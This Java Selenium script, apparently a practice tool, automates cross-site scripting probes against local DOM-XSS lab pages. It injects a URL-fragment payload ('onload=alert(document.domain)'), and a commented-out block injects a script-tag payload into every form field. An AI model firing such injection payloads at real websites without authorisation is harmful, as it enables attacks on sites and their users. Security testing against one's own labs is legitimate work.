package Simon;

import java.util.List;

import org.openqa.selenium.By;
import org.openqa.selenium.UnhandledAlertException;
import org.openqa.selenium.WebDriver;
import org.openqa.selenium.WebElement;
import org.openqa.selenium.firefox.FirefoxDriver;

public class Hack 
{
	public static void attack (String url) 
	{
		/*
		 * TODO
		 * 	Bingo - picking up the right elements and attacking them all.
		 * 	Note that the input stays in each field
		 * 	Closing the window after the url attack is not ideal and window stays open :(
		 */
		try 
		{	
			WebDriver driver = new FirefoxDriver();

			try 
			{
				driver.get(url + "#\"onload=alert(document.domain)//");
				driver.get("");
			} 
			catch (UnhandledAlertException e1) 
			{
				// TODO Auto-generated catch block
				//System.out.println("Got Alert tag=" + element.getTagName() + " id=" + element.getAttribute("id"));
				System.out.println("Got Alert in " + url + " attack after # ");
			}
/*
			driver.get(url);
			
			List<WebElement> elements = driver.findElements(By.ByTagName.tagName("input"));
			elements.addAll(driver.findElements(By.ByTagName.tagName("textarea")));

			System.out.println("Got elements " + elements.size());
			
			if (elements != null) 
			{
				for (WebElement element : elements) 
				{
					String target = "tag=" + element.getTagName() + " id=" + element.getAttribute("id");
					System.out.println("Trying " + target);
					
					try 
					{
						element.sendKeys("</script><script>alert(1);</script>");
						System.out.println("Post sendKeys");
						element.click();
					} 
					catch (UnhandledAlertException e1) 
					{
						// TODO Auto-generated catch block
						//System.out.println("Got Alert tag=" + element.getTagName() + " id=" + element.getAttribute("id"));
						System.out.println("Got Alert in " + url + " target=" + target);

						driver.switchTo().alert();
						driver.switchTo().alert().accept();
						driver.switchTo().defaultContent();
					}
				}
			}*/
			driver.close();
		} 
		catch (Exception e) 
		{
			// TODO Auto-generated catch block
			e.printStackTrace();
		}

	}

	/**
	 * @param args
	 */
	public static void main(String[] args) 
	{
		//String url = "http://escape.alf.nu/0/";
		// http://localhost:8080/domxss/url01.html
		
		//attack("http://localhost:8080/domxss/esc00.html");
		//attack("http://localhost:8080/domxss/url01.html");
		attack("http://localhost/domxss/url01.html");

	}
}
